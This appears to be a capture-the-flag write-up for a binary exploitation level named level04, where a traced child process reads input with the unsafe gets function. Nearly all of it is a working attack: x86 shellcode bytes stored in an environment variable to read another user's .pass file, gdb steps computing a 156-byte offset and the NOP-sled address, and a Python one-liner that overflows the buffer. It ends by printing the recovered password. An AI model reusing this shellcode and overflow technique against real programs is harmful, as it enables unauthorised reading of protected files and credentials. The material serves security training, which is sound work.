Program behavior:
1. The program creates a child proccess and trace it for state changes;
2. The child reads from stdin to a buffer using vulnurable `gets` function;
3. If the child terminated (normally or by a signal) the parent terminates;
4. If the child called to `execve` the parent kills it and terminates.

Solution:
Call a shellcode which will open/read the file and write on stdout it's content.

# Store a shellcode inside the enviroment variable
export SHELLCODE=`python -c 'print "\x90" * 42 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
# Launch the debugger
gdb level04
# Disassemble main function
disassemble main
`0x080486d0 <+8>:     sub    $0xb0,%esp`
`0x080486e2 <+26>:    lea    0x20(%esp),%ebx`
# Run the debugged program
start
# Calculate the offset
print/d ($ebp + 4) - ($esp - 0xb0 + 0x20)
`$1 = 156`
# Check the SHELLCODE address
x/s *environ
`0xffffd866:      "SHELLCODE=(...)`
# Add some bytes to hit a NOP sled
print/a *environ + 15
`$2 = 0xffffd875`
# Quit the debugger
quit
# Initiate buffer overflow attack
python -c 'print("B" * 156 + "\x75\xd8\xff\xff")' | ./level04
`3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
